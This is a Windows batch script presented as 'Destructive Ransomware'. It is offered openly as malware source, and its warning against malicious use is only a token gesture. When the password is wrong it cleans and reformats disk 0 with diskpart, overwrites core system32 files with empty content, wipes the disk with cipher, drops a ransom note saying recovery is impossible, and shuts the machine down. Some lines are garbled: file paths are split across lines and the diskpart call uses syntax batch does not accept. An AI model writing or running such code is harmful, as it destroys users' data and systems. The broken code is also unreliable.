@echo off  
title Destructive Ransomware - DO NOT USE MALICIOUSLY!

:: Configuration - CHANGE THESE VALUES AT YOUR EXTREME PERIL!  
set "targetDir=%USERPROFILE%\Documents"  
set "encryptionKey=skulls"  
set "ransomNote=README.txt"  
set "attempts=1"  
set "password="

:: --- DO NOT MODIFY BELOW THIS LINE UNLESS YOU TRULY WANT TO DESTROY A SYSTEM ---

:: Function to destroy the MBR  
:destroyMBR  
echo Destroying Master Boot Record...  
diskpart /s <<< "select disk 0  
clean  
create partition primary  
format fs=fat32 quick  
exit"  
goto :eof

:: Function to overwrite system files  
:overwriteSystemFiles  
echo Overwriting critical system files...  
copy nul c:\windows\system32  
toskrnl.exe /y  
copy nul c:\windows\system32  
tdll.dll /y  
copy nul c:\windows\system32\hal.dll /y  
goto :eof

:: Function to wipe the disk multiple times  
:wipeDisk  
echo Wiping disk...  
for /l %%a in (1,1,3) do (  
echo Running pass %%%a  
cipher /w:c:\ /s  
)  
goto :eof

:: Create the ransom note  
:createRansomNote  
echo. > %ransomNote%  
echo Your files have been encrypted and your system is being destroyed. >> %ransomNote%  
echo There is no way to recover your data. >> %ransomNote%  
echo Attempts: %attempts% >> %ransomNote%  
goto :eof

:: Main execution  
:main  
echo.  
echo Enter password:  
set /p "password="

if "%password%" neq "%encryptionKey%" (  
    echo Incorrect password. Initiating system destruction...  
    call :destroyMBR  
    call :overwriteSystemFiles  
    call :wipeDisk  
    call :createRansomNote  
    shutdown /s /t 0  
) else (  
    echo Password correct. System is safe (for now).  
)

pause  
exit  